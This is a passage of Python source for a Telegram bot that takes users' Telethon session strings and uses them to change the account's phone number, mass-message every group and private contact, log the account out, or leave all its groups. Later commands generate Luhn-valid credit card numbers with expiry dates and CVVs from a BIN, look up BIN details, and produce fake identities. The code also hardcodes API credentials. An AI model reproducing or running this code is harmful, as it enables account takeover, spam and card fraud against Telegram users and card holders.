            strses = await x.wait_event(events.NewMessage, timeout=60)
            op = await cu(strses)
            if not op:
                return await event.respond("""Invalid Session please use another one.
            
ترمكس خاطئ حاول غيره""", buttons=keyboard)
            await x.send_message("""Send the number which you want in the account\n[It's suggested to not use VoIP] 
      
ارسل الرقم الذي تود تغييره اليه""")
            number = (await x.get_response()).text
            try:
                result = await change_number(strses, number)
                await event.respond(result + """\n Copy the phone number otp code\nI will sleep for 20sec copy phone code has and otp.
        
انسخ الHash Code وانتضر عشرين ثانية""")
                await asyncio.sleep(20)
                await x.send_message("""Send Hash Code 
        
ارسل الهاش""")
                phone_code_hash = (await x.get_response()).text
                await x.send_message("""Send OTP
                             
ارسل الرمز الذي وصل للعاتف""")
                otp = (await x.get_response()).text
                changing = await change_number_code(strses, number, phone_code_hash, otp)
            
                if changing:
                    await event.respond("""Changed Phone number successfully
          
تم تغيير الرقم بنجاح""")
                else:
                    await event.respond("""Uknown Error
          
خطا غير معلوم error 48520 oery2hqouro3q273y1034ur23oq8w4iuhnfowkuaysrfoil3qw""")
            except Exception as e:
                await event.respond("""Send this error code to - @QuadriIIion\n**LOGS**\n
        
خطا حدث ارسل هاذا للمالكين""" + str(e))
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            await event.respond(f"An error occurred: {str(e)}")




@client.on(events.CallbackQuery(data=re.compile(b"N")))
async def connect(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return 

    user_id = event.sender_id

    # Check if the user is a developer
    is_developer = user_id in Developers

    # Check if the user is on cooldown, except for developers
    if not is_developer and user_id in command_cooldown:
        cooldown_end_time = command_cooldown[user_id]
        time_remaining = cooldown_end_time - datetime.now()

        if time_remaining.total_seconds() > 0:
            await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
            return

    # Update the command cooldown for the user, except for developers
    if not is_developer:
        command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)

    keyboard = [
        [
            Button.inline("1", data="1"), 
            Button.inline("2", data="2"),
            Button.inline("3", data="3"),
        ],
        [
            Button.url("Dev", "https://t.me/PrivaPact")
        ]
    ]
    await event.reply("""Choose where to broadcast message 

✓ For All - Choose 1 للكل

✓ For Group - Choose 2 للكروبات

✓ For Private - Choose 3 للخاص 
    
    
اختر اين الارسال""", buttons=keyboard)
import asyncio
from telethon import types
async def gcasta(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for sweetie in X.iter_dialogs():
                chat = sweetie.entity
                if isinstance(chat, (types.Chat, types.User)):
                    try:
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(0.5)  # Add a delay between sending messages
                    except Exception as e:
                        print(e)
        except Exception as e:
            print(e)
        except telethon.errors.rpcerrorlist.QueryIdInvalidError:
            pass

async def gcastap(strses, msg):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()
    try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for sweetie in bot.iter_dialogs():
                chat = sweetie.entity
                if isinstance(chat, (types.Chat, types.User)):
                    try:
                        await bot.send_message(chat, tol, file=file)
                        await asyncio.sleep(0.5)  # Add a delay between sending messages
                    except Exception as e:
                        print(e)
    except Exception as e:
            print(e)
    except telethon.errors.rpcerrorlist.QueryIdInvalidError:
            pass

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"1")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return 
    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can gcast to all.
                           
الان ارسل لي كود الترمكس للكل""")
                                 
            strses = await x.wait_event(events.NewMessage)
            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                return

            await x.send_message("""Send message.
            
ارسل الرسالة""")
            msg = (await x.get_response()).text
            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")
            try:
                await gcasta(session, msg) if strses.text.startswith("1") or strses.text.endswith("=") else await gcastap(session, msg)
                await message.edit("""Done Gcasted to all
                
تم الارسال للكل""", buttons=keyboard)
            except Exception as e:
                print(f"An error occurred: {str(e)}")
                await event.reply("""An error occurred while performing the broadcast.
                
حدث خطا اثناء البث""", buttons=keyboard)
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            await event.reply("Invalid session. Please provide a valid Termux session.", buttons=keyboard)



async def gcastb(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            sent_groups = []
            async for sweetie in X.iter_dialogs():
                if sweetie.is_group:
                    chat = sweetie.id
                    try:
                        if chat != -1001878403490:
                            await X.send_message(chat, tol, file=file)
                            sent_groups.append(chat)
                        elif chat == -1001878403490:
                            pass
                    except Exception as e:
                        print(e)
            return sent_groups
        except Exception as e:
            print(e)

async def gcastbp(strses, msg):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()
    try:
            reply_msg = msg
            tol = reply_msg
            file = None
            sent_groups = []
            async for sweetie in bot.iter_dialogs():
                if sweetie.is_group:
                    chat = sweetie.id
                    try:
                        if chat != -1001878403490:
                            await bot.send_message(chat, tol, file=file)
                            sent_groups.append(chat)
                        elif chat == -1001878403490:
                            pass
                    except Exception as e:
                        print(e)
            return sent_groups
    except Exception as e:
            print(e)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"2")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return
    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session to gcast in groups
            
الان ارسل لي الترمكس لكي ارسلها الى الكروبات""")
            strses = await x.wait_event(events.NewMessage)
            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
            await x.send_message("""Send message
            
ارسل الرسالة""")
            msg = (await x.get_response()).text
            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")
            try:
                sent_groups = await gcastb(session, msg) if strses.text.startswith("1") or strses.text.endswith("=") else await gcastbp(session, msg)
                sent_group_count = len(sent_groups)
                if sent_group_count > 0:
                    await message.edit(f"""Done Gcasted in {sent_group_count} Groups
                    
تم الارسال إلى {sent_group_count} كروب""", buttons=keyboard)
                else:
                    await event.reply("""No groups found to broadcast the message.
                    
لا يوجد كروبات لإرسال الرسالة إليها""", buttons=keyboard)
            except Exception as e:
                print(f"An error occurred: {str(e)}")
                await event.reply("""An error occurred while performing the broadcast.
                
حدث خطا اثناء البث""", buttons=keyboard)
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            await event.reply("Invalid session. Please provide a valid Termux session.", buttons=keyboard)



async def gcastc(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            count = 0
            async for krishna in X.iter_dialogs():
                if krishna.is_user and not krishna.entity.bot:
                    chat = krishna.id
                    try:
                        await X.send_message(chat, tol, file=file)
                        count += 1
                    except BaseException:
                        pass
            return count
        except Exception as e:
            print(e)


async def gcastcp(strses, msg):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()
    try:
            reply_msg = msg
            tol = reply_msg
            file = None
            count = 0
            async for krishna in bot.iter_dialogs():
                if krishna.is_user and not krishna.entity.bot:
                    chat = krishna.id
                    try:
                        await bot.send_message(chat, tol, file=file)
                        count += 1
                    except BaseException:
                        pass
            return count
    except Exception as e:
            print(e)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"3")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return 
    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session to gcast in private
            
ارسل لي الترمكس لكي ارسل الرسالة الى جميع الخاصات""")
            strses = await x.wait_event(events.NewMessage)
            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
            await x.send_message("""Send message
            
ارسل الرسالة""")
            msg = (await x.get_response()).text
            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")
            try:
                i = await gcastc(session, msg) if strses.text.startswith("1") or strses.text.endswith("=") else await gcastcp(session, msg)
                await message.edit(f"""Done Gcasted In {i} Private 
                
تم الارسال الى جميع الخاصات""", buttons=keyboard)
            except Exception as e:
                print(f"An error occurred: {str(e)}")
                await event.reply("""An error occurred while performing the broadcast.
                
حدث خطا اثناء البث""", buttons=keyboard)
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            await event.reply("Invalid session. Please provide a valid Termux session.", buttons=keyboard)



from telethon.sessions import StringSession




@client.on(events.CallbackQuery(data=re.compile(b"O")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return

    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can Log out.
                           
الآن أرسل لي كود الترمكس لكي أسجل الخروج""")
            sender_id = event.sender_id 
            strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
            op = await cu(strses.text)
            if not op:
                await event.respond("""Invalid Session. Please use another one.
        
كود الترمكس غير صالح. الرجاء استخدام كود آخر.""", buttons=keyboard)
                return
            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")
            # Perform actions with the client using the provided Termux session
            # Here, we log out of the account
            async with TelegramClient(StringSession(strses.text), api_id, api_hash) as termux_client:
                await termux_client.log_out()
                await message.edit("""Logged out successfully from the provided Termux session.
            
تم تسجيل الخروج بنجاح من جلسة الترمكس المقدمة.""", buttons=keyboard)
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            print(f"An error occurred: {str(e)}")



@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"P")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return

    user_id = event.sender_id

    # Check if the user is a developer (exempt from cooldown)
    is_developer = user_id in Developers

    # Check if the user is on cooldown and not a developer
    if not is_developer and user_id in command_cooldown:
        cooldown_end_time = command_cooldown[user_id]
        time_remaining = cooldown_end_time - datetime.now()

        if time_remaining.total_seconds() > 0:
            await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
            return

    # Update the command cooldown for the user
    command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)

    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can make the user leave all his channel/group.

الآن أرسل لي جلسة Termux لكي أخرج المستخدم من كل القنوات/المجموعة.""")
                                 
            sender_id = event.sender_id 
            strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
            session = validate_session(strses.text)
            if session:
                pass
            else:
                return await event.respond("""Invalid Session, please use another one.
                                   
ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
                return


            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")
            try:
                await leaveall(session) if strses.text.startswith("1") or strses.text.endswith("=") else await leaveallp(session)
                await event.respond("""Left all channels/groups successfully.

تمت المغادرة من جميع القنوات/المجموعات بنجاح.""", buttons=keyboard)
            except errors.UserNotParticipantError:
                await event.respond("""The target user is not a member of the specified channel/group.
                
المستخدم ليس عضو في الكروب / قناة """)
     
        except TimeoutError:
            return await event.respond("""Please provide the termux session withing 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
        except Exception as e:
            await event.respond(f"An error occurred: {str(e)}")
            
            


rules = '''
Please read and accept the following terms and conditions:

1. This bot is made for entertainment purposes only. The results generated by the bot are not guaranteed to be accurate, reliable, or suitable for any specific purpose.

2. The bot does not take any responsibility for any consequences or damages resulting from the use of its services. Users utilize the bot at their own risk.

3. The bot does not endorse, promote, or encourage any illegal, unethical, or harmful activities. Users are responsible for their own actions and the implications thereof.

4. The bot does not provide any financial, legal, or professional advice. Any information provided by the bot should not be considered as a substitute for professional consultation or guidance.

5. The bot does not assume responsibility for the content shared or transmitted through its services. Users are solely responsible for the content they generate or share using the bot.

8. The bot reserves the right to modify, suspend, or terminate its services at any time without prior notice. It may also update these terms and conditions periodically, and users are encouraged to review them regularly.

9. The bot reserves the right to block, ban, or restrict access to its services for users who violate the terms and conditions, engage in abusive behavior, or disrupt the bot's operations.

10. The bot has full authority to ban, block, or suspend users at its discretion, without explanation or justification.


يرجى قراءة البنود والشروط التالية والموافقة عليها:

1. تم إنشاء هذا الروبوت لأغراض الترفيه فقط. النتائج التي تم الحصول عليها بواسطة الروبوت ليست مضمونة أن تكون دقيقة أو موثوقة أو مناسبة لأي غرض محدد.

2. لا يتحمل الروبوت أي مسؤولية عن أي عواقب أو أضرار ناتجة عن استخدام خدماته. يستخدم المستخدمون الروبوت على مسؤوليتهم الخاصة.

3. لا يؤيد الروبوت أو يروج أو يشجع على أي أنشطة غير قانونية أو غير أخلاقية أو ضارة. المستخدمون مسؤولون عن أفعالهم والآثار المترتبة عليها.

4. لا يقدم الروبوت أي مشورة مالية أو قانونية أو مهنية. لا ينبغي اعتبار أي معلومات يقدمها الروبوت بديلاً عن الاستشارة أو التوجيه المهني.

5. لا يتحمل الروبوت المسؤولية عن المحتوى الذي يتم مشاركته أو نقله من خلال خدماته. يتحمل المستخدمون وحدهم المسؤولية عن المحتوى الذي ينشئونه أو يشاركونه باستخدام الروبوت.

8. يحتفظ الروبوت بالحق في تعديل خدماته أو تعليقها أو إنهاؤها في أي وقت دون إشعار مسبق. قد تقوم أيضًا بتحديث هذه الشروط والأحكام بشكل دوري ، ويتم تشجيع المستخدمين على مراجعتها بانتظام.

9. يحتفظ الروبوت بالحق في حظر أو حظر أو تقييد الوصول إلى خدماته للمستخدمين الذين ينتهكون الشروط والأحكام أو ينخرطون في سلوك 
مسيء أو يعطلون عمليات الروبوت.

10. يتمتع الروبوت بالسلطة الكاملة لحظر المستخدمين أو حظرهم أو تعليقهم وفقًا لتقديره ، دون تفسير أو تبرير.
'''

@client.on(events.NewMessage(pattern='/check'))
async def check(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return
    message_text = event.raw_text
    bin_value = message_text.split('/check ')[1].strip() if len(message_text.split()) > 1 else None

    if not bin_value:
        await event.respond("""Please provide a BIN value. Example: /check 123456
        
الرجاء ادخال البين مثال : 123456 /check""")
        return

    bin_details = perform_bin_lookup(bin_value)
    await event.respond(format_bin_lookup_details(bin_details))

@client.on(events.NewMessage(pattern=re.compile(r'/id(\s+\w{2})?$', re.IGNORECASE)))
async def generate_random_user_data(event):
    message_text = event.raw_text
    country_code = re.search(r'/id(\s+\w{2})?$', message_text, re.IGNORECASE)
    
    if country_code:
        country_code = country_code.group(1)
        if country_code:
            country_code = country_code.strip().upper()

    if not country_code:
        await event.respond("""Please provide a country code. Example : /id US

الرجاء ادخال رمز الدولة مثال : /id US""")
        return

    user_data = get_random_user_data(country_code)

    if user_data:
        response = f"[👤] Name ↯ {user_data['name']['title']}. {user_data['name']['first']} {user_data['name']['last']}\n" \
                   f"[📧] Email ↯ {user_data['email']}\n" \
                   f"[☎️] Phone ↯ {user_data['phone']}\n" \
                   f"\n" \
                   f"[🛣] Street ↯ {user_data['location']['street']['number']} {user_data['location']['street']['name']}\n" \
                   f"[🏙] City ↯ {user_data['location']['city']}\n" \
                   f"[🗽] State ↯ {user_data['location']['state']}\n" \
                   f"[📟] Postal Code ↯ {user_data['location']['postcode']}\n" \
                   f"[🗺] Country ↯ {user_data['location']['country']} "

        await event.respond(response)
    else:
        await event.respond("""User data not found. Please try again.
        
لم يتم ايجاد بيانات""")


def get_random_user_data(country_code):
    response = requests.get(f"https://randomuser.me/api/?nat={country_code}")
    if response.status_code == 200:
        data = response.json()
        user_data = data['results'][0]
        return user_data
    else:
        return None




@client.on(events.NewMessage(pattern=r'/gen(\s+(\d{6}))?$'))
async def generate_random_credit_cards(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return
    bin_number = event.pattern_match.group(2)

    if not bin_number or not bin_number.isnumeric() or len(bin_number) != 6:
        await event.respond("""Invalid format! Example: /gen 123456 or /gen 123456/12/34/567

كتابة خاطئي حاول :  123456 /gen او 123456/12/34/567 /gen""")
        return

    cc_numbers = []
    for _ in range(10):
        cc_number, expiry_month, expiry_year, cvv = generate_random_cc(bin_number)
        cc_numbers.append(f"{cc_number}|{expiry_month:02d}|{expiry_year}|{cvv}")

    cc_formatted = '\n'.join(cc_numbers)
    bin_lookup_details = perform_bin_lookup(bin_number)
    response = f"[⚙] Format → {bin_number}xxxxxxxxxx|10|rnd 10\n\n[🎰] Amount → 10\n\n{cc_formatted}\n\n" + format_bin_lookup_details(bin_lookup_details)
    await event.respond(response)





@client.on(events.NewMessage(pattern=r'/gen (\d{6})/(\d{2})/(\d{2})/(\d{3})'))
async def generate_specific_credit_cards(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)
    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return
    bin_number = event.pattern_match.group(1)
    expiry_month = event.pattern_match.group(2)
    expiry_year = event.pattern_match.group(3)
    cvv = event.pattern_match.group(4)

    if not bin_number or not bin_number.isnumeric() or len(bin_number) != 6:
        await event.respond("""Invalid format! Example: /gen 123456 or /gen 123456/12/34/567

كتابة خاطئي حاول :  123456 /gen او 123456/12/34/567 /gen""")
        return

    cc_numbers = []
    for _ in range(10):
        cc_number = generate_specific_cc(bin_number, expiry_month, expiry_year, cvv)
        cc_numbers.append(cc_number)

    cc_formatted = '\n'.join(cc_numbers)
    bin_lookup_details = perform_bin_lookup(bin_number)
    response = f"[⚙] Format → {bin_number}xxxxxxxxxx|{expiry_month}/{expiry_year[-2:]}|{cvv}\n\n[🎰] Amount → 10\n\n{cc_formatted}\n\n" + format_bin_lookup_details(bin_lookup_details)
    await event.respond(response)


def generate_random_cc(bin_number):
    ccbin = re.sub(r'[^0-9x]', '', bin_number)

    if bin_number.startswith('37'):
        cc_length = 16
    else:
        cc_length = 15

    ccbin = ''.join(random.choice('0123456789') if digit == 'x' else digit for digit in ccbin)
    cc_number = ccgen_number(ccbin, cc_length)

    cvv = generate_random_cvv(bin_number)
    expiry_month = generate_month()
    expiry_year = generate_year()

    return cc_number, expiry_month, expiry_year, cvv


def generate_specific_cc(bin_number, expiry_month, expiry_year, cvv):
    ccbin = re.sub(r'[^0-9x]', '', bin_number)

    if bin_number.startswith('37'):
        cc_length = 16
    else:
        cc_length = 15

    ccbin = ''.join(random.choice('0123456789') if digit == 'x' else digit for digit in ccbin)
    cc_number = ccgen_number(ccbin, cc_length)

    return f'{cc_number}|{expiry_month:02d}|{expiry_year}|{cvv}'


def perform_bin_lookup(bin_value):
    response = requests.get(f"https://lookup.binlist.net/{bin_value}")
    if response.status_code == 200:
        bin_data = response.json()
        bank_name = bin_data['bank'].get('name', 'N/A')
        return {
            'BIN': bin_value,
            'Scheme': bin_data.get('scheme', 'N/A').capitalize(),
            'Type': bin_data.get('type', 'N/A').capitalize(),
            'Brand': bin_data.get('brand', 'N/A'),
            'Country': bin_data['country'].get('name', 'N/A'),
            'Bank': bank_name,
            'Currency': bin_data['country'].get('currency', 'N/A')
        }
    else:
        return {}


def format_bin_lookup_details(bin_details):
    if bin_details:
        formatted_details = [
            f"[📟] Bin ↯ ({bin_details['BIN']}) {bin_details['Scheme']} - {bin_details['Type']} - {bin_details['Brand']}",
            f"[🏦] Bank ↯ {bin_details['Bank']}",
            f"[🗺] Country ↯ {bin_details['Country']}",
            f"[💵] Currency ↯ {bin_details['Currency']}"
        ]
        return '\n'.join(formatted_details)
    else:
        return """BIN lookup failed. Please try again.
        
البين خاطء حاول غيره"""


def generate_random_cvv(bin_number):
    if bin_number.startswith('37'):
        return random.randint(112, 998)
    else:
        return random.randint(102, 998)


def generate_month():
    return random.randint(1, 12)


def generate_year():
    return random.randint(2022, 2025)


def ccgen_number(prefix, length):
    cc_number = prefix
    while len(cc_number) < (length - 1):
        cc_number += str(random.randint(0, 9))

    cc_number_reversed = cc_number[::-1]
    sum = 0
    pos = 0

    while pos < length - 1:
        odd = int(cc_number_reversed[pos]) * 2
        if odd > 9:
            odd -= 9
        sum += odd
        if pos != (length - 2):
            sum += int(cc_number_reversed[pos + 1])
        pos += 2

    check_digit = ((sum // 10 + 1) * 10 - sum) % 10
    cc_number += str(check_digit)

    return cc_number


print("started!")
bot.run_until_disconnected()
